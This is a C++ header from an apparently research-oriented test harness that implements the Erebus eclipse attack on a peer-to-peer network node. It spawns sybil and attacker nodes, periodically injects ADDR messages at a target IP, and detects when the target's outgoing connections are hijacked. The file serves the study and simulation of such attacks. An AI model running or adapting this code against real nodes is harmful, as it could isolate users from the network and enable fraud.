#ifndef EREBUS_ATTACK_POLICY_H
#define EREBUS_ATTACK_POLICY_H

#include <list>
#include <ctime>
#include <chrono>

#include "../node/BenignNode.h"
#include "../node/ShadowActiveNode.h"
#include "../node/ShadowNode.h"
#include "utility/AttackStat.h"

#include "../ipdb/IPDatabase.h"

using namespace std;

namespace sybiltest {

    template<class NodePrimitives, class NodeParams>
    class ErebusAttackPolicy {

    public:
        ErebusAttackPolicy() : libev_loop(EV_DEFAULT) {
            _checkWatcher.set<ErebusAttackPolicy, &ErebusAttackPolicy<NodePrimitives, NodeParams>::_checkAttack>(
                    this);
            _checkWatcher.start();
        }

        // step 1. construct virtual network using sybil nodes
        bool ConstructSybilNet(IPDatabase &ipdb, std::string targetIP,
                               int targetPort) {
            vector<pair<string, vector<int>>> &vIPDurationPair = ipdb.GetIPDurationpair();
            ipdb.Initialize(NodeParams::reachableIPNum, NodeParams::unreachableIPNum, NodeParams::shadowIPNum);

            vector<string> &vReachableIP = ipdb.GetVReachableIP();
            map<string, vector<int>> &mIPDuration = ipdb.GetMIPDuration();
            vector<string> &vAttackerIP = ipdb.GetVAttackerIP();
            vector<string> &vShadowIP = ipdb.GetVShadowIP();


            // Spawn network consisting of pre-defined number of benign nodes
            for (auto &ip : vReachableIP) {
                auto &benignNode = _benignNodes.emplace_back(&_attackStat, &ipdb, ip, NodeParams::targetPort);
                benignNode.SetTarget(targetIP, targetPort);

                // set a churn toggle timer for all the benign nodes
                vector<int> duration = mIPDuration[ip];
                for(auto timestamp : duration) {
                    benignNode.SetChurnToggleTimer(timestamp);
                }
            }
            std::cout << "benign node objects are constructed" << "\n";
            std::cout << "size of reachable IP:" << vReachableIP.size() << "\n";

            // Spawn network consisting of sybil nodes
            for (auto ip : vShadowIP) {
                auto &shadowNode = _shadowNodes.emplace_back(&_attackStat, &ipdb, ip, NodeParams::targetPort);
                shadowNode.SetTarget(targetIP, targetPort);
            }
            std::cout << "spawned shadow nodes\n" ;
            // Spawn attacker node
            int attackerNum = 100;
            assert(vAttackerIP.size() >= attackerNum);

            std::cout << "enough attacker IPs found\n";
            for(int i=0; i < attackerNum; i++) {
                ShadowActiveNode<NodePrimitives> *_attackerNode = new ShadowActiveNode<NodePrimitives>(&_attackStat, &ipdb, vAttackerIP[i]);
                std::cout << "Attacker " << i << ": " << vAttackerIP[i] <<"\n";
                // Let attacker node to connect to the target
                _attackerNode->tryConnectToTarget(targetIP, targetPort, 1);
                _attackerNodes.push_back(_attackerNode);
            }
            std::cout << "spawned attacker nodes\n";
            // Let attacker node to periodically call ADDR injection API
            _addrInjectTimer.set<ErebusAttackPolicy, &ErebusAttackPolicy::_timercb>(this);
            _addrInjectTimer.set(NodeParams::addrInjectionStartTime, NodeParams::addrInjectionDelay);
            _addrInjectTimer.start();
            std::cout<< "addrInjectTimer set\n";

            return true;
        }

        list <BenignNode<NodePrimitives>> &GetBenignNodes() { return _benignNodes; }

        list <ShadowNode<NodePrimitives>> &GetShadowNodes() { return _shadowNodes; }


    private:
        void _timercb(ev::timer &w, int revents) {
            std::cout<<"Injecting from attacker "<<attackerNodeIdx<<"\n";
            _attackerNodes[attackerNodeIdx]->OpAddrInjectionTimeout(NodeParams::preparePhaseTimeLength, NodeParams::addrInjectionDelay,
                                                  NodeParams::addrInjectionIPPerSec,
                                                  NodeParams::addrInjectionShadowRate);
            _attackerNodes[attackerNodeIdx]->UpdateDataSocketWatcher();
            attackerNodeIdx++;
            if(attackerNodeIdx == _attackerNodes.size())
                attackerNodeIdx = 0;
        }

        ev::timer _addrInjectTimer;

    private:
        list <BenignNode<NodePrimitives>> _benignNodes;
        list <ShadowNode<NodePrimitives>> _shadowNodes;
        vector<ShadowActiveNode<NodePrimitives> *> _attackerNodes;
        int attackerNodeIdx = 0;
        AttackStat _attackStat;

    private:
        void _checkAttack() {
            // If we hijacked victim's incoming connection more than predefined target number,
            // it means that attack is successful, so break the main loop.
            if (_attackStat.GetHijackedOutgoingConnNum() >= NodeParams::targetOutgoingConnNum) {
                std::cout << "The EREBUS attack is succeeded." << "\n";
                std::cout << "Pre-defined target outgoing connection num = " << NodeParams::targetOutgoingConnNum
                          << "\n";
                std::cout << "Hijacked outgoing connection num = " << _attackStat.GetHijackedOutgoingConnNum() << "\n";

                std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
                std::string s(30, '\0');
                std::strftime(&s[0], s.size(), "%Y-%m-%d %H:%M:%S", std::localtime(&now));
                std::cout << "End time:" << s << "\n";

                ev_break(libev_loop, EVBREAK_ONE);
            }
        }

    protected:
        struct ev_loop *libev_loop = nullptr;
        ev::check _checkWatcher;
    };
}

#endif
